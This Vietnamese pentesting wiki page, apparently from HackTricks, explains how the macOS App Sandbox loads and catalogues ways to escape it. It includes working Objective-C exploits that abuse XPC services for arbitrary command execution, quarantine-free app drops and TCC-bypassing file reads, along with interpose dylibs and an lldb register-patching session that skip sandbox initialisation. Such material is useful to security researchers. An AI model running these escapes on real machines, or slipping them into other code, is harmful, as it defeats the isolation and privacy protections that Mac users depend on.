# Debug & bypass macOS Sandbox

{{#include ../../../../../banners/hacktricks-training.md}}

## Quy trình nạp sandbox

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Hình ảnh từ <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Trong hình ảnh trước, có thể thấy **sandbox được nạp như thế nào** khi chạy một ứng dụng có entitlement **`com.apple.security.app-sandbox`**.

Compiler sẽ liên kết `/usr/lib/libSystem.B.dylib` vào binary.

Sau đó, **`libSystem.B`** gọi một số hàm cho đến khi **`xpc_pipe_routine`** gửi các entitlement của ứng dụng đến **`securityd`**. Securityd kiểm tra xem tiến trình có cần bị cách ly trong sandbox hay không và thực hiện cách ly nếu cần.\
Cuối cùng, sandbox được kích hoạt bằng lời gọi **`__sandbox_ms`**, hàm này gọi **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>

## Các cách bypass khả thi

### Bypass thuộc tính quarantine

**Các file được tạo bởi tiến trình chạy trong sandbox** sẽ được gắn **thuộc tính quarantine** để ngăn sandbox escape: nếu bạn thả một ứng dụng mới vào đó rồi thử khởi chạy, cờ quarantine sẽ chặn ứng dụng. Do đó, **nếu có thể thả một file hoặc thư mục *không có* thuộc tính quarantine, bạn có thể thoát khỏi App Sandbox** — chỉ cần thả một bundle `.app` rồi khởi chạy bằng `open`, vì tiến trình mới được khởi chạy dưới LaunchServices chứ không phải trong sandbox của bạn.

Cách đáng tin cậy để **thả file không có quarantine** là yêu cầu **một tiến trình khác tạo file đó giúp bạn**. Như Mickey Jin trình bày trong [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), **App Sandbox** gắn quarantine cho các file được thả, nhưng **dịch vụ XPC chạy trong Service Sandbox thì không**. Vì vậy, có thể dùng một số dịch vụ XPC không yêu cầu xác thực làm primitive "rửa quarantine":<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) và **CVE-2023-32414** (`ArchiveService`): giải nén archive do ứng dụng chạy trong sandbox cung cấp vào vị trí được chọn **mà không truyền tiếp xattr quarantine** cho nội dung đã giải nén.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): lỗi path traversal trong `submitSignpostDataWithConfig:` cho phép tạo **các thư mục tùy ý không có quarantine**, đủ để dựng toàn bộ cấu trúc bundle `.app` bên ngoài container.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): gắn một DMG có quarantine **mà không gắn quarantine cho thiết bị được tạo ra**, nhờ vậy có thể khởi chạy ứng dụng trên volume đã mount.

> [!TIP]
> Thao tác giải nén thường **loại bỏ bit quyền thực thi**. Workaround được dùng trong CVE-2023-27944 là đặt một **symlink** trỏ đến binary hệ thống đã ký sẵn (ví dụ `/System/Library/CoreServices/Automator Application Stub`) làm executable chính của bundle. Cách này giúp có thể khởi chạy bundle mà không cần quyền `+x` trên file được thả.

> [!CAUTION]
> Cách này hoạt động vì bước kiểm tra dựa trên **cờ của mục được khởi chạy**: *"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*, rồi mới *"it's handed over to Gatekeeper for full 'first run' security checks"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Không có cờ trên bundle bạn khởi chạy đồng nghĩa với việc không cần qua bước kiểm tra của Gatekeeper — đây chính là primitive mà các CVE trên cung cấp.<sup>[[5]](#references)</sup>
>
> Lưu ý rằng nếu một bundle `.app` đã được cấp quyền chạy (nó có xattr quarantine với cờ "authorized to run"), bạn cũng có thể lạm dụng bundle đó... tuy nhiên, giờ đây bạn không thể ghi vào bên trong các bundle **`.app`** trừ khi có một số quyền TCC đặc quyền (mà bạn sẽ không có trong sandbox).

### Lạm dụng chức năng Open

Trong [**các ví dụ cuối cùng về bypass sandbox của Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv), có thể thấy chức năng CLI **`open`** bị lạm dụng để bypass sandbox như thế nào.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Ngay cả khi một ứng dụng **được thiết kế để chạy trong sandbox** (`com.apple.security.app-sandbox`), vẫn có thể bypass sandbox nếu ứng dụng được **chạy từ LaunchAgent** (ví dụ `~/Library/LaunchAgents`).\
Như giải thích trong [**bài viết này**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), nếu muốn duy trì persistence bằng một ứng dụng chạy trong sandbox, bạn có thể thiết lập để ứng dụng tự động chạy dưới dạng LaunchAgent và có thể inject mã độc thông qua các biến môi trường DyLib.<sup>[[6]](#references)</sup>

### Lạm dụng các vị trí tự khởi động

Nếu một tiến trình chạy trong sandbox có thể **ghi** vào một vị trí mà **sau đó một ứng dụng không chạy trong sandbox sẽ thực thi binary**, tiến trình đó có thể **thoát sandbox chỉ bằng cách đặt** binary vào đó. Các vị trí điển hình thuộc loại này là `~/Library/LaunchAgents` hoặc `/System/Library/LaunchDaemons`.

Trong trường hợp này, thậm chí có thể cần **2 bước**: khiến một tiến trình có **sandbox ít hạn chế hơn** (`file-read*`, `file-write*`) thực thi mã của bạn; mã này sẽ ghi vào một vị trí mà sau đó được **thực thi ngoài sandbox**.

Xem trang này về **các vị trí tự khởi động**:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Lạm dụng các tiến trình khác

Nếu từ tiến trình chạy trong sandbox, bạn có thể **chiếm quyền các tiến trình khác** chạy trong sandbox ít hạn chế hơn (hoặc không có sandbox), bạn sẽ có thể thoát sang sandbox của chúng:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Các Mach service hệ thống và người dùng khả dụng

Sandbox cũng cho phép giao tiếp với một số **Mach service** thông qua XPC được định nghĩa trong profile `application.sb`. Nếu có thể **lạm dụng** một trong các service này, bạn có thể **thoát khỏi sandbox**.

Như được nêu trong [bài phân tích này](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), thông tin về Mach service được lưu trong `/System/Library/xpc/launchd.plist`. Có thể tìm tất cả Mach service hệ thống và người dùng bằng cách tìm `<string>System</string>` và `<string>User</string>` trong file đó.<sup>[[4]](#references)</sup>

Ngoài ra, có thể kiểm tra xem một Mach service có khả dụng với ứng dụng chạy trong sandbox hay không bằng cách gọi `bootstrap_look_up`:

```objectivec
void checkService(const char *serviceName) {
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
    if (!err) {
      NSLog(@"available service:%s", serviceName);
      mach_port_deallocate(mach_task_self_, service_port);
    }
}

void print_available_xpc(void) {
    NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
    NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
    for (NSString* key in launchDaemons) {
      NSDictionary<NSString*, id>* job = launchDaemons[key];
      NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
      for (NSString* serviceName in machServices) {
          checkService(serviceName.UTF8String);
      }
    }
}
```

### Các Mach service PID hiện có

Các Mach service này lần đầu bị khai thác để [thoát khỏi sandbox trong bài viết này](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). Vào thời điểm đó, **tất cả XPC service mà ứng dụng và framework của nó cần** đều hiển thị trong miền PID của ứng dụng (đây là các Mach Service có `ServiceType` là `Application`).<sup>[[4]](#references)</sup>

Để **liên hệ với một XPC service thuộc PID Domain**, chỉ cần đăng ký service đó bên trong ứng dụng bằng một dòng như sau:

```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```

Ngoài ra, có thể tìm tất cả các Mach service **Application** bằng cách tìm `<string>Application</string>` trong `System/Library/xpc/launchd.plist`.

Một cách khác để tìm các xpc service hợp lệ là kiểm tra những service trong:

```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```

Có thể tìm thấy một số ví dụ khai thác kỹ thuật này trong [**bài viết gốc**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), tuy nhiên, dưới đây là một số ví dụ tóm tắt.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Service này cho phép mọi kết nối XPC bằng cách luôn trả về `YES`, và method `runTask:arguments:withReply:` thực thi một lệnh tùy ý với các tham số tùy ý.

exploit này "đơn giản chỉ là":

```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
    [conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
    [conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
    [conn resume];
    
    [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
        NSLog(@"run task result:%@, error:%@", bSucc, error);
    }];
}
```

#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

XPC service này cho phép mọi client bằng cách luôn trả về `YES`, và method `createZipAtPath:hourThreshold:withReply:` chấp nhận đường dẫn đến một folder rồi nén folder đó thành file ZIP.

Do đó, có thể tạo cấu trúc folder của một app giả, nén nó, rồi giải nén và thực thi app đó để thoát khỏi sandbox, vì các file mới sẽ không có thuộc tính quarantine.

Exploit như sau:

```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
    NSString *currentPath = NSTemporaryDirectory();
    chdir([currentPath UTF8String]);
    NSLog(@"======== preparing payload at the current path:%@", currentPath);
    system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
    system("chmod +x compressed/poc.app/Contents/MacOS/poc");
    
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
    [conn resume];
    
    [[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
        NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
        NSString *file;
        while ((file = [dirEnum nextObject])) {
            if ([[file pathExtension] isEqualToString: @"zip"]) {
                // open the zip
                NSString *cmd = [@"open " stringByAppendingString:file];
                system([cmd UTF8String]);

                sleep(3); // wait for decompression and then open the payload (poc.app)
                NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
                system([cmd2 UTF8String]);
                break;
            }
        }
    }];
}
```

#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Dịch vụ XPC này cho phép cấp quyền đọc và ghi đối với một URL tùy ý cho client XPC thông qua phương thức `extendAccessToURL:completion:`, vốn chấp nhận mọi kết nối. Vì dịch vụ XPC có FDA, có thể lợi dụng các quyền này để hoàn toàn bypass TCC.

Exploit như sau:

```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
    [conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
    [conn resume];
    
    [[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
        NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
        NSURL *targetURL = [fpWrapper url];
        
        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
        PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
        if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
            NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
        else {
            NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
            NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
        }
    }];
}
```

### Biên dịch tĩnh & liên kết động

[**Nghiên cứu này**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) đã phát hiện 2 cách bypass Sandbox. Vì sandbox được áp dụng từ userland khi thư viện **libSystem** được tải. Nếu một binary có thể tránh tải thư viện đó, nó sẽ không bao giờ bị sandbox:<sup>[[2]](#references)</sup>

- Nếu binary được **biên dịch tĩnh hoàn toàn**, nó có thể tránh tải thư viện đó.
- Nếu **binary không cần tải bất kỳ thư viện nào** (vì linker cũng nằm trong libSystem), nó sẽ không cần tải libSystem.

### Shellcodes

Lưu ý rằng **ngay cả shellcode** trên ARM64 cũng cần được liên kết với `libSystem.dylib`:

```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```

### Các hạn chế không được kế thừa

Như đã giải thích trong **[phần bổ sung của bài viết này](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, một hạn chế của sandbox như:<sup>[[4]](#references)</sup>

```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```

có thể được bypass bằng cách một tiến trình mới thực thi, ví dụ:

```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```

Tuy nhiên, tất nhiên, tiến trình mới này sẽ không kế thừa entitlements hoặc đặc quyền từ tiến trình cha.

### Entitlements

Lưu ý rằng một số **hành động** có thể được **sandbox cho phép** nếu ứng dụng có một **entitlement** cụ thể, chẳng hạn như:

```scheme
(when (entitlement "com.apple.security.network.client")
      (allow network-outbound (remote ip))
      (allow mach-lookup
             (global-name "com.apple.airportd")
             (global-name "com.apple.cfnetwork.AuthBrokerAgent")
             (global-name "com.apple.cfnetwork.cfnetworkagent")
             [...]
```

### Interposting Bypass

Để biết thêm thông tin về **Interposting**, hãy xem:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer` để ngăn sandbox

```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
    printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
	void (*overriden__libsecinit_initializer)(void);
	void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```

#### Interpost `__mac_syscall` để ngăn Sandbox

```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
        printf("Bypassing Sandbox initiation.\n");
        return 0; // pretend we did the job without actually calling __mac_syscall
    }
    // Call the original function for other cases
    return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
    const void *replacement;
    const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```

### Debug & bypass Sandbox bằng lldb

Hãy biên dịch một ứng dụng cần được sandbox:

{{#tabs}}
{{#tab name="sand.c"}}

```c
#include <stdlib.h>
int main() {
    system("cat ~/Desktop/del.txt");
}
```

{{#endtab}}

{{#tab name="entitlements.xml"}}

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="Info.plist"}}

```xml
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>xyz.hacktricks.sandbox</string>
    <key>CFBundleName</key>
    <string>Sandbox</string>
</dict>
</plist>
```

{{#endtab}}
{{#endtabs}}

Sau đó biên dịch ứng dụng:

```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```

> [!CAUTION]
> Ứng dụng sẽ cố **đọc** tệp **`~/Desktop/del.txt`**, việc mà **Sandbox sẽ không cho phép**.\
> Hãy tạo một tệp ở đó; sau khi vượt qua Sandbox, ứng dụng sẽ có thể đọc tệp này:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Hãy debug ứng dụng để xem Sandbox được tải vào thời điểm nào:

```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
  x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
    0x187659904 <+4>:  svc    #0x80
    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
    0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```

> [!WARNING] > **Ngay cả khi đã bypass Sandbox, TCC vẫn sẽ hỏi người dùng có muốn cho phép tiến trình đọc các tệp trên desktop hay không**

## References

- [1] [Jonathan Levin - Apple Sandbox: Đi sâu hơn vào vũng lầy (slide HITB GSEC 2016)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Thoát khỏi Sandbox của Mac App Store](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - Apple Sandbox: Đi sâu hơn vào vũng lầy (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - Kỷ nguyên mới của các vụ thoát khỏi macOS Sandbox](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Giải thích: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): Bypass macOS TCC với Telegram bằng DyLib Injection (Phần 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
{{#include ../../../../../banners/hacktricks-training.md}}
